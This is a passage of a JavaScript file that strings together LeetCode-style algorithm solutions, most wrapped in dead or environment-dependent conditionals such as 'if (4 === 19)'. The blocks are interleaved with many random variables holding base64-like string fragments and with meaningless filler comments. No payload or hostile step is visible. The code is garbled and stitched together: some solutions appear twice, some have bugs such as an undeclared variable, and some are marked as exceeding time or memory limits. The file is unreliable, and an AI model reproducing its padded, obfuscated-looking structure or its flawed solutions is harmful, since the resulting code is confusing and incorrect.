            newTail = newTail.next;
        } else {
            newHead = node;
            newTail = node;
        }
        
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
        l2 = l2.next;
    }
    
    while (l1) {
        val += l1.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l1 = l1.next;
    }
    
    while (l2) {
        val += l2.val;
        node = new ListNode(val % 10);
        newTail.next = node;
        newTail = newTail.next;
        val = (val >= 10)? 1 : 0;
        l2 = l2.next;
    }
    
    if (val > 0) {
        node = new ListNode(val);
        newTail.next = node;
    }
    
    return newHead;
};

}

    var nafnewyf = 'I5a1pUb2';
if (4 === 19) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}

    var jsvawarr = 'vmUbom';
    var szqbn = 'dOamNnZlN';
    var wjfhwzi = 'Jgzc';
    var kvimb = '3Z0';
if (0.66 && false) {
    // TODO: optimize
/**
 * @param {number} n
 * @return {string[]}
 */
var generateParenthesis = function(n) {
    var i = 1,
        result = [];
    
    if (n === 0) {
        return result;
    }
    
    result.push('()');
    
    while (i < n) {
        result = helper(result);
        i++;
    }
    
    return result;
};

function helper(arr) {
    var len = arr.length,
        result = [],
        len1,
        curStr,
        tmp,
        i,
        j;
        
    len1 = arr[0].length;
    
    for (i = 0; i < len; i++) {
        curStr = arr[i];
        
        for (j = 0; j < len1; j++) {
            tmp = curStr.substring(0, j) + '()' + curStr.substring(j);
            
            if (result.indexOf(tmp) === -1) {
                result.push(tmp);
            }
        }
    }
    
    return result;
}

}

    var ditlbrqbw = 'CJfkZP';
if (3 === 16) {
    /**
The API: int read4(char *buf) reads 4 characters at a time from a file.

The return value is the actual number of characters read. For example, it returns 3 if there is only 3 characters left in the file.

By using the read4 API, implement the function int read(char *buf, int n) that reads n characters from the file.

Note:
The read function may be called multiple times. 
*/
/**
 * Definition for read4()
 * 
 * @param {character[]} buf Destination buffer
 * @return {number} The number of characters read
 * read4 = function(buf) {
 *     ...
 * };
 */

/**
 * @param {function} read4()
 * @return {function}
 */
var solution = function(read4) {
    let helperBuf = [];
    let count = 0; // how many characters read with read4
    let i = 0;
        
    /**
     * @param {character[]} buf Destination buffer
     * @param {number} n Maximum number of characters to read
     * @return {number} The number of characters read
     */
    return function(buf, n) {
        let pointer = 0;
        
        while (pointer < n) {
            if (i === 0) {
                count = read4(helperBuf);
            }
            
            while (i < count && pointer < n) {
                buf[pointer++] = helperBuf[i++];
            }
            
            // read4 buffer used up, start over
            if (i === count) {
                i = 0;
            }
            
            // end of file
            if (count < 4) {
                break;
            }
        }
        
        return pointer;
    };
};

}

    var zbczd = 'x5OGdR';
if (7 instanceof String) {
    /**
You are playing the following Bulls and Cows game with your friend: You write down a number and ask your friend to guess what the number is. Each time your friend makes a guess, you provide a hint that indicates how many digits in said guess match your secret number exactly in both digit and position (called "bulls") and how many digits match the secret number but locate in the wrong position (called "cows"). Your friend will use successive guesses and hints to eventually derive the secret number.

For example:

Secret number:  "1807"
Friend's guess: "7810"
Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.)
Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return "1A3B".

Please note that both secret number and friend's guess may contain duplicate digits, for example:

Secret number:  "1123"
Friend's guess: "0111"
In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return "1A1B".
You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal.
*/
/**
 * @param {string} secret
 * @param {string} guess
 * @return {string}
 */
var getHint = function(secret, guess) {
    var len = secret.length,
        bullCount = 0,
        arr = {},
        cowCount = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (!arr[secret.charAt(i)]) {
            arr[secret.charAt(i)] = 1;
        } else {
            arr[secret.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) === guess.charAt(i)) {
            bullCount++;
            arr[secret.charAt(i)]--;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (secret.charAt(i) !== guess.charAt(i) && arr.hasOwnProperty(guess.charAt(i)) && (arr[guess.charAt(i)] > 0)) {
            cowCount++;
            arr[guess.charAt(i)]--;
        }
    }
    
    return bullCount + 'A' + cowCount + 'B';
};

}

    var xiypnpklcmbw = 'hRmuueCj';
    var gspyleuib = 'MjFrS';
    var bymeqcontgsh = 'bIbMEfDHkS';
    var shpwtnavbgih = 'zBGc2R';
    var egkzxyxuzd = 'ccWw';
// return world compile event
    var axpviyug = 'rGniLPqHZ';
if (!true && 0) {
    /**
Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

Note: You may not slant the container.

 * @param {number[]} height
 * @return {number}
 */
var maxArea = function(height) {
    var len = height.length, 
        left = 0,
        right = len - 1,
        max = 0;
    
    while (left < right) {
        max = Math.max(max, (right - left)*Math.min(height[left], height[right]));
        
        if (height[left] < height[right]) {
            left ++;
        } else {
            right --;
        }
    }
    return max;
};

}

    var qvcke = 'DdERJRz';
    var rcjnrd = 'WOqCE';
    var dtgnlnhhd = 'l1SUcxaFk';
if (9 instanceof String) {
    /**
You are given an n x n 2D matrix representing an image.

Rotate the image by 90 degrees (clockwise).

Follow up:
Could you do this in-place?
*/

/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var rotate = function(matrix) {
    var len = matrix.length,
        i,
        level,
        tmp;
    
    level = 0;
    
    while (level < len/2) {
        for (i = level; i < len - level - 1; i++) {
           tmp = matrix[level][i];
           matrix[level][i] = matrix[len - i - 1][level];
           matrix[len - i - 1][level] = matrix[len - 1 - level][len - 1 - i];
           matrix[len - 1 - level][len - 1 - i] = matrix[i][len - 1 - level];
           matrix[i][len - 1 - level] = tmp;
        }
        level++;
    }
};

}

    var ybntwzbtr = 'ObmSA';
    var jhyoy = 'wOV';
    var stkalddyf = 'oYDkjD';
    var pajtez = 'RDaUFnSUN';
    var ezosjkjueo = 'ajlAvlnnQB';
    var psejnlthcgte = 'BZ0lDQWdle';
    var olafplq = 'xaqbit';
    var njzbpbtswwwhe = 'UJ0W';
if (typeof document === 'undefined') {
    /**
Given a positive integer, return its corresponding column title as appear in an Excel sheet.

For example:

    1 -> A
    2 -> B
    3 -> C
    ...
    26 -> Z
    27 -> AA
    28 -> AB 
*/
/**
 * @param {number} n
 * @return {string}
 */
var convertToTitle = function(n) {
    var result = '',
        cur;
    
    //97 is the ASCII code for lower case 'a'. If you want uppercase letters, replace 97 with 65 (uppercase 'A'). 
    
    while (n > 0) {
        cur = (n - 1) % 26;
        result = String.fromCharCode(65 + cur) + result;
        n = Math.floor((n - 1) / 26);
    }
    
    return result;
};

}

    var abaovbd = 'RovcwH';
if (typeof window === 'undefined') {
    /**
Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array.

Formally the function should:
Return true if there exists i, j, k 
such that arr[i] < arr[j] < arr[k] given 0 ≤ i < j < k ≤ n-1 else return false.
Your algorithm should run in O(n) time complexity and O(1) space complexity.

Examples:
Given [1, 2, 3, 4, 5],
return true.

Given [5, 4, 3, 2, 1],
return false.

Credits:
Special thanks to @DjangoUnchained for adding this problem and creating all test cases.
*/
/**
 * @param {number[]} nums
 * @return {boolean}
 */
var increasingTriplet = function(nums) {
    var len = nums.length,
        x1 = Number.MAX_VALUE,
        x2 = Number.MAX_VALUE,
        i;
        
    for (i = 0; i < len; i++) {
        if (nums[i] < x1) {
            x1 = nums[i];
        } else if (x1 < nums[i] && nums[i] < x2) {
            x2 = nums[i];
        } else if (nums[i] > x2) {
            return true;
        }
    }
    
    return false;
};

}

    var ibcrxiznpfdfos = 'lhSa';
    var xavpua = 'KWoXacCz';
// function
    var gehopkkagc = 'sVgwSTL';
    var nwjnbyhehketdle = 'E9pQjBjbl';
if ('n' === 'K') {
    /**
Given a 2D board containing 'X' and 'O', capture all regions surrounded by 'X'.

A region is captured by flipping all 'O's into 'X's in that surrounded region.

For example,
X X X X
X O O X
X X O X
X O X X
After running your function, the board should be:

X X X X
X X X X
X X X X
X O X X
*/

/**
 * @param {character[][]} board
 * @return {void} Do not return anything, modify board in-place instead.
 */
var solve = function(board) {
    if (board === null) {
        return;
    }
    
    var rowL = board.length,
        columnL,
        i,
        j;
    
    if (rowL <= 1) {
        return;
    }
    
    columnL = board[0].length;
    
    // visit borders
    for (i = 0; i < rowL; i++) {
        visit(board, i, 0, rowL, columnL);
        visit(board, i, columnL - 1, rowL, columnL);
    }
    
    // visit borders
    for (i = 1; i < columnL - 1; i++) {
        visit(board, 0, i, rowL, columnL);
        visit(board, rowL - 1, i, rowL, columnL);
    }
    
    // flip all 'O' to 'X' and flip all 'Y' to 'O'
    for (i = 0; i < rowL; i++) {
        for (j = 0; j <columnL; j++) {
            if (board[i][j] === 'O') {
                board[i][j] = 'X';
            } else if (board[i][j] === 'Y') {
                board[i][j] = 'O';
            }
        }
    }
};

// flip connected 0 to 'Y'
function visit(board, i, j, rowL, columnL) {
    if (i < 0 || j < 0 || i >= rowL || j >= columnL || board[i][j] !== 'O') {
        return;
    }
    
    var queue = [],
        cur,
        row,
        column;
    
    board[i][j] = 'Y';
    queue.push(i * columnL + j);
    
    while(queue.length > 0) {
        cur = queue.pop();
        row = Math.floor(cur / columnL);
        column = cur % columnL;
        
        if (row > 0 && board[row - 1][column] === 'O') {
            queue.push((row - 1)*columnL + column);
            board[row - 1][column] = 'Y';
        }
        
        if (row < rowL -1 && board[row + 1][column] === 'O') {
            queue.push((row + 1)*columnL + column);
            board[row + 1][column] = 'Y';
        }
        
        if (column > 0 && board[row][column - 1] === 'O') {
            queue.push(row * columnL + column - 1);
            board[row][column - 1] = 'Y';
        }
        
        if (column < columnL - 1 && board[row][column + 1] === 'O') {
            queue.push(row * columnL + column + 1);
            board[row][column + 1] = 'Y';
        }
    }
} 

}

    var ncylchboni = 'TAFhUTRB';
// return object code array function array number hello aqkq define return string hello async export
    var sonwce = 'dcDjFsFR';
if (null === 1) {
    /**
Given a binary tree, find its minimum depth.

The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.

 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var minDepth = function(root) {
    if (root === null) {
        return 0;
    }
    
    if (root.left === null) {
        return minDepth(root.right) + 1;
    }
    
    if (root.right === null) {
        return minDepth(root.left) + 1;
    }
    
    return Math.min(minDepth(root.left), minDepth(root.right)) + 1;
};

}

    var wurdn = 'ZsTENCclpY';
if (!true && 0) {
    /**
Given preorder and inorder traversal of a tree, construct the binary tree.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number[]} preorder
 * @param {number[]} inorder
 * @return {TreeNode}
 */
var buildTree = function(preorder, inorder) {
    /**
    假设树的先序遍历是12453687，中序遍历是42516837。这里最重要的一点就是先序遍历可以提供根的所在，而根据中序遍历的性质知道根的所在就可以将序列分为左右子树。比如上述例子，我们知道1是根，所以根据中序遍历的结果425是左子树，而6837就是右子树。接下来根据切出来的左右子树的长度又可以在先序便利中确定左右子树对应的子序列（先序遍历也是先左子树后右子树）。根据这个流程，左子树的先序遍历和中序遍历分别是245和425，右子树的先序遍历和中序遍历则是3687和6837，我们重复以上方法，可以继续找到根和左右子树，直到剩下一个元素。可以看出这是一个比较明显的递归过程，对于寻找根所对应的下标，我们可以先建立一个HashMap，以免后面需要进行线行搜索，这样每次递归中就只需要常量操作就可以完成对根的确定和左右子树的分割。
    */
    var map = {},
        len = inorder.length,
        i;
    
    for (i = 0; i < len; i++) {
        map[inorder[i]] = i;
    }
    
    return helper(preorder, 0, len - 1, inorder, 0, len - 1, map);
};

function helper(preorder, preL, preR, inorder, inL, inR, map) {
    var root,
        index;
    
    if (preL > preR || inL > inR) {
        return null;
    }
    
    root = new TreeNode(preorder[preL]);
    index = map[root.val];
    
    root.left = helper(preorder, preL + 1, index - inL + preL, inorder, inL, index - 1, map);
    root.right = helper(preorder, index - inL + preL + 1, preR, inorder, index + 1, inR, map);
    
    return root;
}

}

    var tsgliyxyc = 'sjoKDiz';
    var zockdhelyf = 'bERiM';
if (typeof window === 'undefined') {
    /**
Write a program to find the n-th ugly number.

Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 1, 2, 3, 4, 5, 6, 8, 9, 10, 12 is the sequence of the first 10 ugly numbers.

Note that 1 is typically treated as an ugly number.

Hint:

The naive approach is to call isUgly for every number until you reach the nth one. Most numbers are not ugly. Try to focus your effort on generating only the ugly ones.
An ugly number must be multiplied by either 2, 3, or 5 from a smaller ugly number.
The key is how to maintain the order of the ugly numbers. Try a similar approach of merging from three sorted lists: L1, L2, and L3.
Assume you have Uk, the kth ugly number. Then Uk+1 must be Min(L1 * 2, L2 * 3, L3 * 5).
*/
/**
 * @param {number} n
 * @return {number}
 */
var nthUglyNumber = function(n) {
    var result = [],
        primeIndex2 = 0,
        primeIndex3 = 0,
        primeIndex5 = 0,
        cur2,
        cur3,
        cur5,
        i;
    
    result.push(1);
    
    for (i = 1; i < n;) {
        cur2 = result[primeIndex2] * 2;
        cur3 = result[primeIndex3] * 3;
        cur5 = result[primeIndex5] * 5;
        
        cur = Math.min(cur2, cur3, cur5);
        
        if (cur === cur2) {
            primeIndex2++;
        } else if (cur === cur3) {
            primeIndex3++;
        } else {
            primeIndex5++;
        }
        
        if (cur !== result[i - 1]) {
            result.push(cur);
            i++;
        }
    }
    
    return result.pop();
};

}

    var tycadhugoq = 'UgCjeTzwq';
// await variable function hello string exvl await constant define variable
if (!true && 0) {
    /**
The set [1,2,3,…,n] contains a total of n! unique permutations.

By listing and labeling all of the permutations in order,
We get the following sequence (ie, for n = 3):

"123"
"132"
"213"
"231"
"312"
"321"
Given n and k, return the kth permutation sequence.

Note: Given n will be between 1 and 9 inclusive.
*/
/**
 * @param {number} n
 * @param {number} k
 * @return {string}
 */
var getPermutation = function(n, k) {
    var arr = [],
        num = [],
        result = '',
        i;
    
    for (i = 1; i <= n; i++) {
        arr.push(i);
        num.push(0);
    }
    
    k = k - 1; // there're k - 1 permutations before
    i = 0;
    
    if (k === 0) {
        return arr.join('');
    }
    
    while(k > 0) {
        num[i] = parseInt(k / getFactorial(n - 1));
        k = k % getFactorial(n - 1);
        n--;
        i++;
    }
    
    for (i = 0; i < num.length; i++) {
        result += arr[num[i]];
        arr.splice(num[i], 1);
    }
    
    return result;
};

function getFactorial(n) {
    var result = 1;
    
    if (n === 0) {
        return 0;
    }
    
    while (n > 1) {
        result *= n;
        n--;
    }
    
    return result;
}

}

    var xcmjid = 'aExgg';
if (94 > 185) {
    /**
You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters.

For example, given:
s: "barfoothefoobarman"
words: ["foo", "bar"]

You should return the indices: [0,9].
(order does not matter).
*/
/**
 * @param {string} s
 * @param {string[]} words
 * @return {number[]}
 */
 
 // TIME LIMIT EXCEEDED...
var findSubstring = function(s, words) {
    var len = s.length,
        wordsLen = words.length,
        wordLen = words[0].length,
        i,
        j,
        m,
        temp,
        toFound = {},
        found = {},
        result = [];
        
    for (i = 0; i < wordsLen; i++) {
        if (!toFound[words[i]]) {
            toFound[words[i]] = 1; 
        } else {
            toFound[words[i]]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        found = {};
        j = i;
        for (m = 0; m < wordsLen; m++) {
            temp = s.slice(j, j + wordLen);
            
            if (!toFound[temp]) {
                break;
            }
            
            if (toFound[temp]) {
                if (!found[temp]) {
                    found[temp] = 1;
                } else {
                    found[temp]++;
                }
            }
            
            if (found[temp] > toFound[temp]) {
                break;
            }
            
            j += wordLen;
        }
        
        if (m === wordsLen) {
            result.push(i);
        }
    }
    
    return result;
};

}

    var jxtlwncgnynqegh = 'lJsT2';
    var oyrwlr = 'WgMfx';
if (Array.isArray(1)) {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var thxlbnacwefmcxa = 'lBNE5';
if ('false' === true) {
    /**
Given an integer matrix, find the length of the longest increasing path.

From each cell, you can either move to four directions: left, right, up or down. You may NOT move diagonally or move outside of the boundary (i.e. wrap-around is not allowed).

Example 1:

nums = [
  [9,9,4],
  [6,6,8],
  [2,1,1]
]
Return 4
The longest increasing path is [1, 2, 6, 9].

Example 2:

nums = [
  [3,4,5],
  [3,2,6],
  [2,2,1]
]
Return 4
The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.
*/
/**
 * @param {number[][]} matrix
 * @return {number}
 */
var longestIncreasingPath = function(matrix) {
    var dp = [], // dp[i][j] the longest increasing path starting from matrix[i][j]
        rLen = matrix.length,
        cLen,
        i,
        j,
        max = 0;
    
    if (rLen === 0) {
        return 0;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        dp.push(new Array(cLen));
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            dp[i][j] = 0;
        }
    }
    
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            max = Math.max(max, dfs(i, j, rLen, cLen, matrix, dp));
        }
    }
    
    return max;
};

function dfs(i, j, rLen, cLen, matrix, dp) {
    if (dp[i][j] !== 0) {
        return dp[i][j];
    }
    
    var dx = [1, 0, 0, -1],
        dy = [0, 1, -1, 0],
        max = 1,
        m,
        len,
        x,
        y;
        
    for (m = 0; m < 4; m++) {
        x = dx[m] + i;
        y = dy[m] + j;
        
        if (x >= 0 && y >= 0 && x < rLen && y < cLen && matrix[x][y] > matrix[i][j]) {
            max = Math.max(max, 1 + dfs(x, y, rLen, cLen, matrix, dp));
        }
    }
    
    dp[i][j] = max;
    
    return max;
}

}

    var iqmgbzqhljk = 'JCbWc';
    var pqxmgmmqabmbn = 'TQjl';
    var eeyeepjip = 'MYQPRQWREJ';
if (10 === 17) {
    /**
Given a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring.

For "(()", the longest valid parentheses substring is "()", which has length = 2.

Another example is ")()())", where the longest valid parentheses substring is "()()", which has length = 4.
*/

/**
 * @param {string} s
 * @return {number}
 */
var longestValidParentheses = function(s) {
    var len = s.length,
        last = -1,
        left = [],
        max = 0,
        i;
    
    // the important thing here is track the last ')'
    for (i = 0; i < len; i++) {
        if (s.charAt(i) === '(') {
            left.push(i);
        } else {
            if (left.length === 0) {
                last = i;
            } else {
                left.pop();
                if (left.length === 0) {
                    max = Math.max(max, i - last);
                } else {
                    max = Math.max(max, i - left[left.length - 1]);
                }
            }
        }
    }
    
    return max;
};

}

    var xvjoszhg = 'JQzh2SU';
if (8 instanceof String) {
    /**
Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.

Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.

For example, you may serialize the following tree

    1
   / \
  2   3
     / \
    4   5
as "[1,2,3,null,null,4,5]", just the same as how LeetCode OJ serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.
Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * Encodes a tree to a single string.
 *
 * @param {TreeNode} root
 * @return {string}
 */
var serialize = function(root) {
    var result = [];
    
    sHelper(root, result);
    return result.toString();
};

function sHelper(root, result) {
    if (root === null) {
        result.push('#');
        return;
    }
    
    result.push(root.val);
    sHelper(root.left, result);
    sHelper(root.right, result);
}
/**
 * Decodes your encoded data to tree.
 *
 * @param {string} data
 * @return {TreeNode}
 */
var deserialize = function(data) {
    var arr = data.split(','),
        len = arr.length;
        
    if (len === 0) {
        return null;
    }
    
    return buildTree(arr);
};

function buildTree(arr) {
    var curNode,
        val;
    
    if (arr.length === 0) {
        return null;
    }
    
    val = arr.shift();
    
    if (val === '#') {
        return null;
    }
    
    curNode = new TreeNode(parseInt(val));
    curNode.left = buildTree(arr);
    curNode.right = buildTree(arr);
    
    return curNode;
}

/**
 * Your functions will be called as such:
 * deserialize(serialize(root));
 */

}

    var eafipzijmg = 'KSAdt';
if ('true' === true) {
    /**
Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring.

*/
// MEMORY LIMIT EXCEEDED....
/**
 * @param {string} s
 * @return {string}
 */
var longestPalindrome = function(s) {
    var len = s.length,
        isPal = [],
        max = 1,
        start = 0,
        end = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        isPal.push(new Array(len));
        isPal[i][i] = true;
    }
    
    for (i = len - 1; i >= 0; i--) {
        for (j = i + 1; j < len; j++) {
            if (s.charAt(i) === s.charAt(j) && (j === i + 1 || isPal[i + 1][j - 1])) {
                isPal[i][j] = true;
                
                if (j - i + 1 > max) {
                    start = i;
                    end = j;
                    max = j - i + 1;
                }
            }
        }
    }
    
    return s.substring(start, end + 1);
};

}

    var lgxssbxvvchsz = 'VOdF';
    var roxaloolnq = 'dzeibniML';
    var uuzuhhvunzdva = 'pDdFZJRzl';
if (4 === 14) {
    /**
Given a linked list, swap every two adjacent nodes and return its head.

For example,
Given 1->2->3->4, you should return the list as 2->1->4->3.

Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var swapPairs = function(head) {
    if (head === null) {
        return null;
    }
    
    var next = head.next,
        result = next? next : head,
        prevTail,
        curHead,
        nextHead;
    
    curHead = head;

    while(next) {
        nextHead = next.next;
        
        if (prevTail) {
            prevTail.next = next;
        }
        
        next.next = curHead;
        curHead.next = nextHead;
        prevTail = curHead;
        
        curHead = nextHead;
        next = curHead && curHead.next;
    }
    
    return result;
};

}

    var lvweeqzy = 'ksXk';
    var kaqlmq = '1SUcxaFk';
    var lunxgg = 'XASzsxi';
if (Array.isArray(1)) {
    /**
Given a string containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.

The brackets must close in the correct order, "()" and "()[]{}" are all valid but "(]" and "([)]" are not.

 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
    if (s === null) {
        return false;
    }
    var stack = [],
        sets = {'(':')', '{':'}', '[':']'},
        len = s.length,
        cur,
        stackTop,
        i;

    for (i = 0; i < len; i++) {
        cur = s.charAt(i);
        if (sets.hasOwnProperty(cur)) {
            stack.push(cur);
        } else {
            if (stack.length === 0) {
                return false;
            } else {
                stackTop = stack.pop();
                if (sets[stackTop] !== cur) {
                    return false;
                }
            }
        }
    }
    if (stack.length === 0) {
        return true;
    } else {
        return false;
    }
    
};

}

    var bionbvrdd = 'wOVRDa';
    var shwxjjm = 'YpLJFB';
// hello event nfqg constant await value function code array await define
    var tebviymvsqlj = 'GftM';
    var lqgqxfksogzey = 'UFnSUNCZE9';
    var pwcbvk = 'aSouzwlQ';
    var okoprx = '3b0tJQ';
if (0 instanceof String) {
    /**
Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring.

*/
// MEMORY LIMIT EXCEEDED....
/**
 * @param {string} s
 * @return {string}
 */
var longestPalindrome = function(s) {
    var len = s.length,
        isPal = [],
        max = 1,
        start = 0,
        end = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        isPal.push(new Array(len));
        isPal[i][i] = true;
    }
    
    for (i = len - 1; i >= 0; i--) {
        for (j = i + 1; j < len; j++) {
            if (s.charAt(i) === s.charAt(j) && (j === i + 1 || isPal[i + 1][j - 1])) {
                isPal[i][j] = true;
                
                if (j - i + 1 > max) {
                    start = i;
                    end = j;
                    max = j - i + 1;
                }
            }
        }
    }
    
    return s.substring(start, end + 1);
};

}

    var rbrotnogpdje = 'EzopVBps';
    var xuvtgo = '0FnSUhKbGR';
if ('true' === true) {
    /**
 * Given an array of size n, find the majority element. The majority element is the element that appears more than ⌊ n/2 ⌋ times.
 * You may assume that the array is non-empty and the majority element always exist in the array.
 * 
 * @param {number[]} num
 * @return {number}
 */
var majorityElement = function(num) {
    var i,
        length = num.length,
        max,
        list = {};
    if (length === 1) {
        return num[0];
    }
    for (i = 0; i < length; i++) {
        if (list[num[i]]) {
            max = ++list[num[i]];
            if (i > length/2 - 1 && max >= length/2) {
                return num[i];
            }
        } else {
            list[num[i]] = 1;
        }
    }
    
};

// SOLUTION 2: voting
var majorityElement = function(num) {
    var candidate,
        length = num.length,
        count = 1,
        i;
        
    candidate = num[0];
    
    for (i = 1; i < length; i++) {
        if (count === 0 || num[i] === candidate) {
            count++;
            candidate = num[i];
        } else {
            count--;
        }
    }
    
    return candidate;
};

}

    var joyngwi = 'lcuxpxlY';
    var wpmfat = 'IVnliaU';
    var kqdgdafub = 'opKEML';
    var ytlfgxvzw = 'J5WlhO';
if ('false' === true) {
    /**
The API: int read4(char *buf) reads 4 characters at a time from a file.

The return value is the actual number of characters read. For example, it returns 3 if there is only 3 characters left in the file.

By using the read4 API, implement the function int read(char *buf, int n) that reads n characters from the file.

Note:
The read function may be called multiple times. 
*/
/**
 * Definition for read4()
 * 
 * @param {character[]} buf Destination buffer
 * @return {number} The number of characters read
 * read4 = function(buf) {
 *     ...
 * };
 */

/**
 * @param {function} read4()
 * @return {function}
 */
var solution = function(read4) {
    let helperBuf = [];
    let count = 0; // how many characters read with read4
    let i = 0;
        
    /**
     * @param {character[]} buf Destination buffer
     * @param {number} n Maximum number of characters to read
     * @return {number} The number of characters read
     */
    return function(buf, n) {
        let pointer = 0;
        
        while (pointer < n) {
            if (i === 0) {
                count = read4(helperBuf);
            }
            
            while (i < count && pointer < n) {
                buf[pointer++] = helperBuf[i++];
            }
            
            // read4 buffer used up, start over
            if (i === count) {
                i = 0;
            }
            
            // end of file
            if (count < 4) {
                break;
            }
        }
        
        return pointer;
    };
};

}

    var zqwztychsxh = 'ZpQAR';
// loop constant async ecqhls constant njke export import export function import async object world
    var tornafy = 'epgSzzJkho';
    var bawlmlmo = 'MGNtbGp';
    var oqfbaqskxhdb = 'MnXEiI';
    var tjctiprndvyr = 'kR1ZrUzJWN';
    var rvboytswh = 'EOSCymDDg';
if (0.35 && false) {
    /**
Given a list of airline tickets represented by pairs of departure and arrival airports [from, to], reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK.

Note:
If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary ["JFK", "LGA"] has a smaller lexical order than ["JFK", "LGB"].
All airports are represented by three capital letters (IATA code).
You may assume all tickets form at least one valid itinerary.
Example 1:
tickets = [["MUC", "LHR"], ["JFK", "MUC"], ["SFO", "SJC"], ["LHR", "SFO"]]
Return ["JFK", "MUC", "LHR", "SFO", "SJC"].
Example 2:
tickets = [["JFK","SFO"],["JFK","ATL"],["SFO","ATL"],["ATL","JFK"],["ATL","SFO"]]
Return ["JFK","ATL","JFK","SFO","ATL","SFO"].
Another possible reconstruction is ["JFK","SFO","ATL","JFK","ATL","SFO"]. But it is larger in lexical order.
*/
/**
 * @param {string[][]} tickets
 * @return {string[]}
 */
var findItinerary = function(tickets) {
    tickets.sort(function(a, b) {
       if (a[0] < b[0]) {
           return -1;
       } else if (a[0] > b[0]) {
           return 1;
       } else {
           if (a[1] < b[1]) {
               return -1;
           }
           
           return 1;
       }
    });
    
    var map = {},
        len = tickets.length,
        result = [],
        i;
        
    for (i = 0; i < len; i++) {
        if (map[tickets[i][0]] === undefined) {
            map[tickets[i][0]] = {};
            map[tickets[i][0]][tickets[i][1]] = 1;
